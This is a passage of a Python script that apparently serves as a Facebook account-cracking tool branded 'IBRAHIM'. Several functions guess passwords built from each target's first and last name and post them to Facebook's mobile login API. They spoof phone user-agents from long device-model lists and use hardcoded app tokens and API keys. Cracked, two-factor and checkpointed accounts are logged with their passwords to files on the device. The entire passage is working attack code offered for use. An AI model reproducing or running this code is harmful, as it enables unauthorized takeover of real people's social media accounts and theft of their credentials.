			fbpn = 'com.facebook.katana'
			nmm = random.choice(ll)
			abc =random.randrange(4,14)
			ua = (uaku)
			#ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+nmm+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/en_us;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/DOCTYPE;FBMF/'+nmm+';FBBD/'+nmm+';FBPN/com.facebook.katana;FBDV/'+nmm+';FBSV/5.0;nullFBCA/'+fbca+';]'
			random_seed = random.Random()
			#ua = "Dalvik/2.1.0 (Linux; U; Android 9; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/300.0.0.6.141;FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/450135250;FBCR/3;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/4;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1412};]"
			adid = str(uuid.uuid4())
			aadid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
			device_id = str(uuid.uuid4())
			secure = str(uuid.uuid4())
			family = str(uuid.uuid4())
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			xd =str(''.join(random_seed.choices(string.digits, k=20)))
			sim_serials = f'["{xd}"]'
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			jazoest = li2+j1
			data = "adid="+aadid+"&format=json&device_id="+nmm+"&cpl=true&family_device_id="+adid+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=device_based_login&email="+ids+"&password="+pas+"&access_token=350685531728|7C62f8ce9f74b12f84c123cc23437a4a32&generate_session_cookies=1&meta_inf_fbmeta=&advertiser_id="+adid+"&currently_logged_in_userid=0&locale=en_US&client_country_code=US&method=auth.login&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&api_key=882a8490361da98702bf97a021ddc14d"
			headers = {
			'Accept-Encoding':'gzip, deflate',
			'Accept':'*/*',
			'Connection':'keep-alive',
			'Host':'graph.facebook.com',
			'x-fb-connection-bandwidth':str(random.randint(2e4,4e5)),
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-quality':'EXCELLENT',
			'content-type':'application/x-www-form-urlencoded',
			'x-fb-http-engine':'Liger',
			'Content-Length':'530',
			'User-Agent':ua}
			url = 'https://b-graph.facebook.com/auth/login'
			po = requests.post(url,data=data,headers=headers).json()
			if 'access_token' in po:
				print('   \033[1;32m[IBRAHIM-OK] '+ids+' | '+pas+           '\033[0;97m')
				ok.append(ids)
				
				open('/sdcard/IBRAHIM-OK.txt','a').write(ids+' | '+pas+'\n')
				
				
				
				break
			elif 'two_factor' in str(po):
				print('\033[1;36m   [IBRAHIM-2F] '+ids+' | '+pas+            '\033[0;97m')
				tf.append(ids)
				
				open('/sdcard/IBRAHIM-2F.txt','a').write(ids+' | '+pas+'\n')
				break
			elif 'www.facebook.com' in str(po):
				print('   \033[1;91m[IBRAHIM-CP] '+ids+' | '+pas+            '\033[0;97m')
				cp.append(ids)
				open('/sdcard/IBRAHIM-CP.txt','a').write(ids+' | '+pas+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
		passo


lll = ['era1X', 'SM-G996N', 'moto', 'SOV42', 'SOV42', 'moto', 'Redmi', 'KB2000', 'V1981A', 'PL5003', 'SM-T561', 'T95ZPLUS', 'ROBBY', 'LG-H871S', 'SKWHP40A-ZWL', 'motorola', 'KM6', 'E6833', 'SM-A705MN', 'DP7CPRO', 'DL3', 'Datsun_D5001', 'LG-H735', 'vivo', 'Google', '706SH', 'X100', 'C5', 'ONE', 'Moto', 'G20', 'C18_Pro', 'hatch', 'Smart_Light', 'SOV43', 'KYV41', 'PICOphone', 'Lenovo', 'AFTSSS', 'CPH2067', 'motorola', 'SM-A705FN', 'HTC_M9u', 'SM-A307GT', 'Sofia', 'H8416', 'Pixel', 'FlipkartTV', 'vivo', 'Redmi', 'vivo', 'soda', 'Lenovo', 'Hi9plus', 'M1', 'General', '5051X', 'Expanse', 'moto', 'ZTE', 'GN5001S', 'T790Z', 'TZ752', 'Leelbox', 'T95MAX', 'SM-A716S', 'moto', 'Andromax', 'moto', 'S20+', 'Micromax', 'Pixel', 'Lenovo', 'I4213', 'TECNO', 'S60Lite', 'SM-T860', 'XT1635-02', 'moto', 'AFTSS', 'IRON', 'SM-G998N', 'SM-J415GN', 'LG-V522', 'POLYTRON', 'T03', 'SM-J111F', 'LEAGOO', 'KOB-L09', 'SM-J700F', 'SM-N920T', 'Lenovo', 'Moto', 'LG-K430', 'SM-G532F', 'AP-107G', 'ZTE', 'MIX', 'U;', 'A37f"', 'MYA-L22', 'DLI-TL20', 'Redmi', 'U;', 'LG-D724"', 'SM-G900F', 'T5c', 'SM-J200H', 'D6503', 'Lenovo', 'NEXBOX-A95X', 'LS-4505', 'SM-G390F', 'FRD-L19', 'SM-G920F', 'LEO_DG280', 'SM-T350', 'HUAWEI', 'Lenovo', 'Tele2_Mini_1.1', 'Lenovo', 'SM-N9200', 'Aquaris', 'SM-G950U', 'SM-J710GN', 'SM-N9005', 'SM-G955F', 'SM-G900I', 'SM-T700', 'SAMSUNG-SM-G930A', 'SM-C5000', 'XT1575', 'SM-A310F', 'HTC_0PJA10', 'SM-T535', 'XT1609', 'SM-J530Y', 'XT1635-01', 'SM-N920V', 'SM-A320FL', 'SM-G930F', 'LG-M154', 'SM-G950F', 'Nexus', 'Lenovo', 'XT1585', 'SM-J701F', 'vivo', 'SM-J106H', 'WAS-LX1A', 'Moto', 'CRO-L03', 'vivo', 'ONEPLUS', 'U10', 'SM-G950N', 'ASUS_Z00AD', 'SHV39', 'LG-H873', 'K10000', 'SM-A730F', 'SM-J500M', 'SM-G532M', 'Nexus', 'F3311', '5022X', 'SM-N950U', 'SM-G925W8', 'SM-G920I', 'LG-H870DS', 'U16', 'iQD700', 'SM-A320F', 'Nexus', '2014817', 'ASUS_Z00TD', 'SM-J500H', 'CPH1609', 'E6883', 'Lenovo', 'Ilium', 'SM-J510FN', 'Nexus', 'SM-G532G', 'SM-J105H', 'HTC', 'SM-J120H', 'X20', 'MX6', 'SM-G920T', 'ViewPad_M10', 'WAS-L03T', 'SM-N950U', 'LG-M150', 'ZTE', 'SM-N9500', 'SM-J510F', 'LGLS775', 'LG-H830', 'Aqua', 'Nomi', '5022D', '6055K', 'VTR-L29', 'X5max_PRO', 'SM-G935W8', 'X2', 'SM-J700M', 'SM-G9500', 'ZTE', 'X5_Max_Pro', 'ZTE', 'DIG-L21HN', 'SM-T285', 'SM-G965U', 'SM-A300H', 'NEM-L51', 'Lenovo', 'Lenovo', 'LG-K130', 'SMART_Surf_4G', 'LG-X210', 'Pace_4G', 'ZTE', 'SLA-L22', 'FS517', 'Impress_Lion_4G', 'ZB500KL', 'Micromax', 'Neffos', 'Tele2_Maxi_Plus', 'Ixion', 'JMM-AL00', 'LLD-L31', 'C6903', 'Lenovo', 'Impress_Luck', 'NX531J', 'SM-G361H', 'Z982', 'G3121', 'F5321', 'EDI-AL10', 'TA-1053', 'PLE-701L', 'M510', 'LS-4505', 'LG-D693n', 'SM-G550FY', 'YU5010A', 'Lenovo', 'VS988', 'Z981', 'Pixel', 'm1', 'VKY-L09', 'LG-H540', 'Z14', 'Moto', 'SM-G955U', 'SM-N920P', 'SM-A500FU', 'TECNO-J8', 'KFAUWI', 'LG-K330', 'U15S', 'SM-G800H', 'D5503', 'D6653', 'SCV37', 'K010', 'CRO-L22', 'itel', 'GT-I9500', 'WAS-LX1', 'SM-J111M', 'SM-S903VL', 'SM-J210F', 'LG-D802', 'F3313', 'XT1565', 'SM-G900M', 'MHA-L29', 'ONE', 'ZTE', 'SM-G610M', 'LG-M700', 'Lenovo', 'LG-M160', 'VS820', 'SM-G570M', 'Pixel', 'SM-J700P', 'CAM-L03', 'HUAWEI', 'SM-T280', 'ZTE', 'SM-J510MN', 'SM-G935U', 'TRT-LX1', 'HT37', 'ALE-L21', 'Monaco', 'Aquaris_M4.5', 'Pixel', 'Moto', 'SAMSUNG-SM-G930A', 'SM-N950F', 'SM-G960U', 'P8000', 'Power', 'XT1650', 'LG-X165g', 'ZTE', 'LG-M210', 'HUAWEI', 'SM-T531', 'Nexus', 'HUAWEI', 'XT1254', 'A1601', 'XT1706', 'SM-G930U', 'SM-N920C', 'S6', 'Moto', 'C6502', 'LIFETAB_P831X.2']


def method3(ids,names,passlist,total_ids):
	global loop,ok,cp,tf
	rcol =['\033[1;32m m2','\033[1;31m m1']
	rr = ['\033[1;32m m2']
	whi = '\033[0;97m'
	sys.stdout.write('\r  [IBRAHIM-M3] %s/%s OK/CP/2F : %s/%s/%s         \r'%(loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = device['android_version']
			model = device['model']
			build = device['build']
			fblc = device['fblc']
			fbcr = sim_id
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			fbca = device['fbca']
			fbdm = device['fbdm']
			fbfw = '1'
			fbrv = '0'
			fban = 'FB4A'
			fbpn = 'com.facebook.katana'
			nmm = random.choice(lll)
			ua = (uaku)
			#ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+nmm+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+nmm+';FBBD/'+nmm+';FBPN/com.facebook.katana;FBDV/'+nmm+';FBSV/5.0;FBCA/'+fbca+';]'
			random_seed = random.Random()
			#ua = 'Dalvik/2.1.0 (Linux; U; Android 9; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/300.0.0.6.141;FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/450135250;FBCR/3;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/4;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1412};]'
			aadid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
			device_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			secure = str(uuid.uuid4())
			family = str(uuid.uuid4())
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			xd =str(''.join(random_seed.choices(string.digits, k=20)))
			sim_serials = f'["{xd}"]'
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			jazoest = li2+j1
			data = "adid="+aadid+"&email="+ids+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=button_with_disabled&source=login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&api_key=882a8490361da98702bf97a021ddc14d"
			headers = {
			#'User-Agent':ua,
			'Accept-Encoding':'gzip, deflate',
			'Accept':'*/*',
			'Connection':'keep-alive',
			'Content-Type':'application/x-www-form-urlencoded',
			'Host':'graph.facebook.com',
			'X-FB-Net-HNI':str(random.randint(2e4,4e4)),
			'X-FB-SIM-HNI':str(random.randint(2e4,4e4)),
			'X-FB-Connection-Type':'MOBILE.LTE',
			'X-Tigon-Is-Retry':'False',
			#'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
			'x-fb-device-group':'5120',
			'X-FB-Friendly-Name':'ViewerReactionsMutation',
			'X-FB-Request-Analytics-Tags':'graphservice',
			'X-FB-HTTP-Engine':'Liger',
			'X-FB-Client-IP':'True',
			'X-FB-Server-Cluster':'True',
			'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62',
			'User-Agent':ua,
			'Content-Length':'706'}
			url = 'https://b-graph.facebook.com/auth/login'
			twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			tu = 'checkpoint/828281030927956/?next=https%3A%2F%2Fweb.facebook.com%2F'
			po = requests.post(url,data=data,headers=headers).json()
			if 'access_token' in po:
				print('   \033[1;32m[IBRAHIM-OK] '+ids+' | '+pas+           '\033[0;97m')
				ok.append(ids)
				open('/sdcard/IBRAHIM-OK.txt','a').write(ids+' | '+pas+'\n')
				
				
				
				break
			elif 'two_factor' in str(po):
				print('   \033[1;36m[IBRAHIM-2F] '+ids+' | '+pas+          '\033[0;97m')
				tf.append(ids)
				
				open('/sdcard/IBRAHIM-2F.txt','a').write(ids+' | '+pas+'\n')
				break
			elif 'www.facebook.com' in str(po):
				print('   \033[1;91m[IBRAHIM-CP] '+ids+' | '+pas+          '\033[0;97m')
				cp.append(ids)
				
				open('/sdcard/IBRAHIM-CP.txt','a').write(ids+' | '+pas+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
		passo


lll = ['era1X', 'SM-G996N', 'moto', 'SOV42', 'SOV42', 'moto', 'Redmi', 'KB2000', 'V1981A', 'PL5003', 'SM-T561', 'T95ZPLUS', 'ROBBY', 'LG-H871S', 'SKWHP40A-ZWL', 'motorola', 'KM6', 'E6833', 'SM-A705MN', 'DP7CPRO', 'DL3', 'Datsun_D5001', 'LG-H735', 'vivo', 'Google', '706SH', 'X100', 'C5', 'ONE', 'Moto', 'G20', 'C18_Pro', 'hatch', 'Smart_Light', 'SOV43', 'KYV41', 'PICOphone', 'Lenovo', 'AFTSSS', 'CPH2067', 'motorola', 'SM-A705FN', 'HTC_M9u', 'SM-A307GT', 'Sofia', 'H8416', 'Pixel', 'FlipkartTV', 'vivo', 'Redmi', 'vivo', 'soda', 'Lenovo', 'Hi9plus', 'M1', 'General', '5051X', 'Expanse', 'moto', 'ZTE', 'GN5001S', 'T790Z', 'TZ752', 'Leelbox', 'T95MAX', 'SM-A716S', 'moto', 'Andromax', 'moto', 'S20+', 'Micromax', 'Pixel', 'Lenovo', 'I4213', 'TECNO', 'S60Lite', 'SM-T860', 'XT1635-02', 'moto', 'AFTSS', 'IRON', 'SM-G998N', 'SM-J415GN', 'LG-V522', 'POLYTRON', 'T03', 'SM-J111F', 'LEAGOO', 'KOB-L09', 'SM-J700F', 'SM-N920T', 'Lenovo', 'Moto', 'LG-K430', 'SM-G532F', 'AP-107G', 'ZTE', 'MIX', 'U;', 'A37f"', 'MYA-L22', 'DLI-TL20', 'Redmi', 'U;', 'LG-D724"', 'SM-G900F', 'T5c', 'SM-J200H', 'D6503', 'Lenovo', 'NEXBOX-A95X', 'LS-4505', 'SM-G390F', 'FRD-L19', 'SM-G920F', 'LEO_DG280', 'SM-T350', 'HUAWEI', 'Lenovo', 'Tele2_Mini_1.1', 'Lenovo', 'SM-N9200', 'Aquaris', 'SM-G950U', 'SM-J710GN', 'SM-N9005', 'SM-G955F', 'SM-G900I', 'SM-T700', 'SAMSUNG-SM-G930A', 'SM-C5000', 'XT1575', 'SM-A310F', 'HTC_0PJA10', 'SM-T535', 'XT1609', 'SM-J530Y', 'XT1635-01', 'SM-N920V', 'SM-A320FL', 'SM-G930F', 'LG-M154', 'SM-G950F', 'Nexus', 'Lenovo', 'XT1585', 'SM-J701F', 'vivo', 'SM-J106H', 'WAS-LX1A', 'Moto', 'CRO-L03', 'vivo', 'ONEPLUS', 'U10', 'SM-G950N', 'ASUS_Z00AD', 'SHV39', 'LG-H873', 'K10000', 'SM-A730F', 'SM-J500M', 'SM-G532M', 'Nexus', 'F3311', '5022X', 'SM-N950U', 'SM-G925W8', 'SM-G920I', 'LG-H870DS', 'U16', 'iQD700', 'SM-A320F', 'Nexus', '2014817', 'ASUS_Z00TD', 'SM-J500H', 'CPH1609', 'E6883', 'Lenovo', 'Ilium', 'SM-J510FN', 'Nexus', 'SM-G532G', 'SM-J105H', 'HTC', 'SM-J120H', 'X20', 'MX6', 'SM-G920T', 'ViewPad_M10', 'WAS-L03T', 'SM-N950U', 'LG-M150', 'ZTE', 'SM-N9500', 'SM-J510F', 'LGLS775', 'LG-H830', 'Aqua', 'Nomi', '5022D', '6055K', 'VTR-L29', 'X5max_PRO', 'SM-G935W8', 'X2', 'SM-J700M', 'SM-G9500', 'ZTE', 'X5_Max_Pro', 'ZTE', 'DIG-L21HN', 'SM-T285', 'SM-G965U', 'SM-A300H', 'NEM-L51', 'Lenovo', 'Lenovo', 'LG-K130', 'SMART_Surf_4G', 'LG-X210', 'Pace_4G', 'ZTE', 'SLA-L22', 'FS517', 'Impress_Lion_4G', 'ZB500KL', 'Micromax', 'Neffos', 'Tele2_Maxi_Plus', 'Ixion', 'JMM-AL00', 'LLD-L31', 'C6903', 'Lenovo', 'Impress_Luck', 'NX531J', 'SM-G361H', 'Z982', 'G3121', 'F5321', 'EDI-AL10', 'TA-1053', 'PLE-701L', 'M510', 'LS-4505', 'LG-D693n', 'SM-G550FY', 'YU5010A', 'Lenovo', 'VS988', 'Z981', 'Pixel', 'm1', 'VKY-L09', 'LG-H540', 'Z14', 'Moto', 'SM-G955U', 'SM-N920P', 'SM-A500FU', 'TECNO-J8', 'KFAUWI', 'LG-K330', 'U15S', 'SM-G800H', 'D5503', 'D6653', 'SCV37', 'K010', 'CRO-L22', 'itel', 'GT-I9500', 'WAS-LX1', 'SM-J111M', 'SM-S903VL', 'SM-J210F', 'LG-D802', 'F3313', 'XT1565', 'SM-G900M', 'MHA-L29', 'ONE', 'ZTE', 'SM-G610M', 'LG-M700', 'Lenovo', 'LG-M160', 'VS820', 'SM-G570M', 'Pixel', 'SM-J700P', 'CAM-L03', 'HUAWEI', 'SM-T280', 'ZTE', 'SM-J510MN', 'SM-G935U', 'TRT-LX1', 'HT37', 'ALE-L21', 'Monaco', 'Aquaris_M4.5', 'Pixel', 'Moto', 'SAMSUNG-SM-G930A', 'SM-N950F', 'SM-G960U', 'P8000', 'Power', 'XT1650', 'LG-X165g', 'ZTE', 'LG-M210', 'HUAWEI', 'SM-T531', 'Nexus', 'HUAWEI', 'XT1254', 'A1601', 'XT1706', 'SM-G930U', 'SM-N920C', 'S6', 'Moto', 'C6502', 'LIFETAB_P831X.2']
def KKK1(ids,passlist):
		global loop
		global oks
		global tl
		sys.stdout.write('\r\r\033[1;37m[SHAZIA] %s/\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		try:
				for pas in passlist:
						accessToken = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28','350685531728|62f8ce9f74b12f84c123cc23437a4a32','6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
						fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
						fbbv = str(random.randint(111111111,999999999))
						android_version = device['android_version']
						model = device['model']
						build = device['build']
						fblc = device['fblc']
						fbcr = sim_id
						fbmf = device['fbmf']
						fbbd = device['fbbd']
						fbdv = device['fbdv']
						fbsv = device['fbsv']
						fbca = device['fbca']
						fbdm = device['fbdm']
						fbfw = '1'
						fbrv = '0'
						fban = 'FB4A'
						fbpn = 'com.facebook.katana'
						abc =random.randrange(4,14)
						nmm = random.choice(lll)
						
						ua = (uaku)
						#ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+nmm+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/3;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/v2020;FBSV/4;FBOP/19;FBCA/'+fbca+';]'

						random_seed = random.Random()
						aadid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
						device_id = str(uuid.uuid4())
						adid = str(uuid.uuid4())
						secure = str(uuid.uuid4())
						family = str(uuid.uuid4())
						accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
						xd =str(''.join(random_seed.choices(string.digits, k=20)))
						sim_serials = f'["{xd}"]'
						li = ['28','29','210']
						li2 = random.choice(li)
						j1 = ''.join(random.choice(digits) for _ in range(2))
						jazoest = li2+j1
						data = "adid="+aadid+"&email="+ids+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=button_with_disabled&source=login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&api_key=882a8490361da98702bf97a021ddc14d"
						headers={'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Type': 'WIFI.LTE', 'X-Tigon-Is-Retry': 'False', 'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '530'}
						url = 'https://b-graph.facebook.com/auth/login'
						twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
						tu = 'checkpoint/828281030927956/?next=https%3A%2F%2Fweb.facebook.com%2F'
						po = requests.post(url,data=data,headers=headers).json()
						if 'session_key' in po:
								try:
										uid = po['uid']
								except:
										uid = ids
								if str(uid) in oks:
										break
								else:
										print('\033[1;92m[IBRAHIM-OK] '+str(uid)+' | '+pas+             '\033[1;97m')
										
										open('/sdcard/IBRAHIM-OK.txt','a').write(str(uid)+'|'+pas+'\n')
										oks.append(str(uid))
										
										break
						elif 'www.facebook.com' in po['error']['message']:
								try:
										uid = po['error']['error_data']['uid']
								except:
										uid = ids
								if uid in oks:pass
								else:
										print('\033[1;91m[IBRAHIM-CP] '+str(uid)+' | '+pas+         '\033[1;97m')
										
										open('/sdcard/IBRAHIM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
										cps.append(str(ids))
										break										
						else:continue
				loop+=1
		except Exception as e:
				pass
#


mod = ['GT-I9190', 'KOT49H', 'GT-I9192', 'KOT49H', 'GT-I9300I', 'KTU84P', 'GT-I9300', 'IMM76D', 'GT-I9300', 'JSS15J', 'GT-I9301I', 'KOT4', 'GT-I9301I', 'KOT49H', 'GT-I9500', 'JDQ39', 'GT-I9500', 'LRX22C', 'GT-N5100', 'JZO54K', 'GT-N7100', 'KOT49H', 'GT-N8000', 'JZO54K', 'GT-N8000', 'KOT49H', 'GT-P3110', 'JZO54K', 'GT-P5100', 'IML74K', 'GT-P5100', 'JDQ', 'GT-P5100', 'JDQ39', 'GT-P5100', 'JZO54K', 'GT-P5110', 'JDQ39', 'GT-P5200', 'KOT49H', 'GT-P5210', 'KOT49H', 'GT-P5220', 'JDQ39', 'GT-S7390', 'JZO54K', 'SAMSUNG', 'SM-A500F', 'SAMSUNG', 'SM-G532F', 'SAMSUNG', 'SM-G920F', 'SAMSUNG', 'SM-G935F', 'SAMSUNG', 'SM-J320F', 'SAMSUNG', 'SM-J510FN', 'SAMSUNG', 'SM-N920S', 'SAMSUNG', 'SM-T280', 'SM-A500FU', 'MMB29M', 'SM-A500F', 'LRX22G', 'SM-A500F', 'MMB29M', 'SM-A500H', 'MMB29M', 'SM-G900F', 'KOT49H', 'SM-G920F', 'MMB29K', 'SM-G920F', 'NRD90M', 'SM-G930F', 'NRD90M', 'SM-G935F', 'MMB29K', 'SM-G935F', 'NRD90M', 'SM-G950F', 'NRD90M', 'SM-J320FN', 'LMY47V', 'SM-J320F', 'LMY4', 'SM-J320F', 'LMY47V', 'SM-J320H', 'LMY47V', 'SM-J320M', 'LMY47V', 'SM-J510FN', 'MMB29M', 'SM-J510FN', 'NMF2', 'SM-J510FN', 'NMF26X', 'SM-J510FN', 'NMF26X;', 'SM-J701F', 'NRD90M;', 'SM-T111', 'JDQ39', 'SM-T230', 'KOT49H', 'SM-T231', 'KOT49H', 'SM-T235', 'KOT4SM-T310', 'KOT49H', 'SM-T311', 'KOT4', 'SM-T311', 'KOT49H', 'SM-T315', 'JDQ39', 'SM-T525', 'KOT49H', 'SM-T531', 'KOT49H', 'SM-T531', 'LRX22G', 'SM-T535', 'LRX22G', 'SM-T555', 'LRX22G', 'SM-T561', 'KTU84P', 'SM-T705', 'LRX22G', 'SM-T705', 'LRX22G', 'SM-T805', 'LRX22G', 'SM-T820', 'NRD90M', 'SPH-L720', 'KOT49H']

def KKK2(ids,passlist):
		global loop
		global oks
		global tl
		sys.stdout.write('\r\r\033[1;37m[IBRAHIM] %s/\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		try:
				for pas in passlist:
						accessToken = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28','350685531728|62f8ce9f74b12f84c123cc23437a4a32','6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
						fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
						fbbv = str(random.randint(111111111,999999999))
						android_version = device['android_version']
						model = device['model']
						build = device['build']
						fblc = device['fblc']
						fbcr = sim_id
						fbmf = device['fbmf']
						fbbd = device['fbbd']
						fbdv = device['fbdv']
						fbsv = device['fbsv']
						fbca = device['fbca']
						fbdm = device['fbdm']
						fbfw = '1'
						fbrv = '0'
						fban = 'FB4A'
						fbpn = 'com.facebook.katana'
						nmm = random.choice(mod)
					
						ua = (uaku)
						#ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+nmm+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1280};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+nmm+';FBBD/'+nmm+';FBPN/com.facebook.katana;FBDV/'+nmm+';FBSV/5.0;FBCA/'+fbca+';]'

						random_seed = random.Random()
						aadid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
						device_id = str(uuid.uuid4())
						adid = str(uuid.uuid4())
						secure = str(uuid.uuid4())
						family = str(uuid.uuid4())
						accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
						xd =str(''.join(random_seed.choices(string.digits, k=20)))
						sim_serials = f'["{xd}"]'
						li = ['28','29','210']
						li2 = random.choice(li)
						j1 = ''.join(random.choice(digits) for _ in range(2))
						jazoest = li2+j1
						data = "adid="+aadid+"&email="+ids+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=button_with_disabled&source=login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&api_key=882a8490361da98702bf97a021ddc14d"
						headers={'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Type': 'WIFI.LTE', 'X-Tigon-Is-Retry': 'False', 'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '530'}
						url = 'https://b-graph.facebook.com/auth/login'
						twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
						tu = 'checkpoint/828281030927956/?next=https%3A%2F%2Fweb.facebook.com%2F'
						po = requests.post(url,data=data,headers=headers).json()
						
						if 'session_key' in po:
								try:
										uid = po['uid']
								except:
										uid = ids
								if str(uid) in oks:
										break
								else:
										print('\033[1;92m[IBRAHIM-OK] '+str(uid)+' | '+pas+             '\033[1;97m')
										print(ua)
										open('/sdcard/IBRAHIM-OK.txt','a').write(str(uid)+'|'+pas+'\n')
										oks.append(str(uid))
										
										#print(coki)
										break
						elif 'www.facebook.com' in po['error']['message']:
								try:
										uid = po['error']['error_data']['uid']
								except:
										uid = ids
								if uid in oks:qpass
								else:
										print('\033[1;91m[IBRAHIM-CP] '+str(uid)+' | '+pas+         '\033[1;97m')
										print(ua)
										#print(coki)
										open('/sdcard/IBRAHIM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
										cps.append(str(ids))
										break
						else:continue
				loop+=1
		except Exception as e:
				pass
#


rdx2() 
